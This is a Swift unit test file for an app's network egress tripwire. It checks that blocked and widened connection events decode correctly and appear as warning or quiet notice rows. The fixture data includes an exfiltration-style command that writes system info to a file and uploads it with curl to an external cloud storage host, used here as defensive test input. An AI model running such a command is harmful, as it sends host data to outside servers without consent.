import XCTest
@testable import Frog

/// The egress tripwire in the app: an `egress_blocked` event decodes and becomes a notice row,
/// and sessions an agent starts are marked `--worker` so the engine enforces the allow-list.
@MainActor
final class EgressTests: XCTestCase {
    private var seq: UInt64 = 0

    private func send(_ c: Conversation, _ event: String) {
        seq += 1
        let line = #"{"seq":\#(seq),"session":"eg","created":1790113417019,"event":\#(event)}"#
        guard let env = try? JSONDecoder.frog.decode(Envelope.self, from: Data(line.utf8)) else {
            return XCTFail("bad event: \(line)")
        }
        c.ingest(env)
    }

    func testABlockedConnectionDecodesAndShowsAsAWarningRow() throws {
        let line = #"{"seq":1,"session":"eg","created":0,"event":"egress_blocked","host":"oss-cn-beijing.aliyuncs.com","port":443,"item":"b","tool":"Bash","command":"uname -a > probe.txt && curl -T probe.txt …","enforced":true}"#
        let env = try JSONDecoder.frog.decode(Envelope.self, from: Data(line.utf8))
        guard case .egressBlocked(let host, let port, let item, let tool, _, let enforced) = env.event else {
            return XCTFail("decoded as \(env.event)")
        }
        XCTAssertEqual(host, "oss-cn-beijing.aliyuncs.com")
        XCTAssertEqual(port, 443)
        XCTAssertEqual(item, "b")
        XCTAssertEqual(tool, "Bash")
        XCTAssertTrue(enforced)

        let c = Conversation(folder: URL(fileURLWithPath: "/tmp"), link: nil, replay: false, session: "eg")
        send(c, #""turn_started","turn":1,"input":"write a defensive rule""#)
        send(c, #""egress_blocked","host":"oss-cn-beijing.aliyuncs.com","port":443,"item":"b","tool":"Bash","command":"curl -T probe.txt …","enforced":true"#)
        // Old engines' fields are optional: a flagged one with only a host still lands.
        send(c, #""egress_blocked","host":"flagged.example","tool":"Bash","command":"""#)
        let notices = c.turns.last?.items.compactMap { item -> (String, Bool)? in
            if case .notice(let warning) = item.kind { return (item.text, warning) }
            return nil
        } ?? []
        XCTAssertEqual(notices.count, 2)
        XCTAssertEqual(notices[0].0, "Blocked a connection to oss-cn-beijing.aliyuncs.com: it isn't on this session's network allow-list (Bash: `curl -T probe.txt …`).")
        XCTAssertTrue(notices[0].1, "a block is a warning")
        XCTAssertEqual(notices[1].0, "A command reached flagged.example, which isn't on the network allow-list (Bash).")
        XCTAssertFalse(notices[1].1)
    }

    /// In a Frog Cloud session the machine is a disposable VM with none of the user's
    /// credentials: the yolo line says what's true there.
    func testWidenedNoticeInCloudSaysCloudMachine() {
        let line = Conversation.widenedNotice(tool: "Bash", command: "echo hi", hosts: [], sandboxLeft: true, cloud: true)
        XCTAssertEqual(line, "Yolo: `echo hi` ran outside the command sandbox, inside your cloud machine; it can change anything on that machine and reach the network.")
        XCTAssertFalse(line.contains("credentials"))
    }

    /// Yolo acted without asking: the event decodes and becomes one quiet row, never a card.
    func testAYoloWideningDecodesAndShowsAsAQuietRow() throws {
        let line = #"{"seq":1,"session":"eg","created":0,"event":"egress_widened","item":"b","tool":"Bash","command":"curl -T probe.txt …","hosts":["pkgs.example.org"],"sandbox_left":false}"#
        let env = try JSONDecoder.frog.decode(Envelope.self, from: Data(line.utf8))
        guard case .egressWidened(let item, let tool, let command, let hosts, let sandboxLeft) = env.event else {
            return XCTFail("decoded as \(env.event)")
        }
        XCTAssertEqual(item, "b")
        XCTAssertEqual(tool, "Bash")
        XCTAssertEqual(command, "curl -T probe.txt …")
        XCTAssertEqual(hosts, ["pkgs.example.org"])
        XCTAssertFalse(sandboxLeft)

        let c = Conversation(folder: URL(fileURLWithPath: "/tmp"), link: nil, replay: false, session: "eg")
        send(c, #""turn_started","turn":1,"input":"fetch it""#)
        send(c, #""egress_widened","item":"b","tool":"Bash","command":"curl -T probe.txt …","hosts":["pkgs.example.org"],"sandbox_left":false"#)
        // A sandbox-leaving call names no hosts, and still reads as one quiet line.
        send(c, #""egress_widened","item":"o","tool":"Bash","command":"echo hi","sandbox_left":true"#)
        let notices = c.turns.last?.items.compactMap { item -> (String, Bool)? in
            if case .notice(let warning) = item.kind { return (item.text, warning) }
            return nil
        } ?? []
        XCTAssertEqual(notices.count, 2)
        XCTAssertEqual(notices[0].0, "Yolo: `curl -T probe.txt …` reaches pkgs.example.org, now allowed for this session.")
        XCTAssertFalse(notices[0].1, "widening is quiet, not a warning")
        XCTAssertEqual(notices[1].0, "Yolo: `echo hi` ran outside the sandbox; it can change files anywhere and read your credentials.")
        XCTAssertFalse(notices[1].1)
    }

    func testAgentStartedSessionsAreWorkers() {
        let req = SessionBroker.StartRequest(title: "w", prompt: "p", cwd: nil, model: nil, mode: nil, worktree: false)
        XCTAssertTrue(SessionBroker.engineFlags(req: req, parent: nil).contains("--worker"))
    }
}
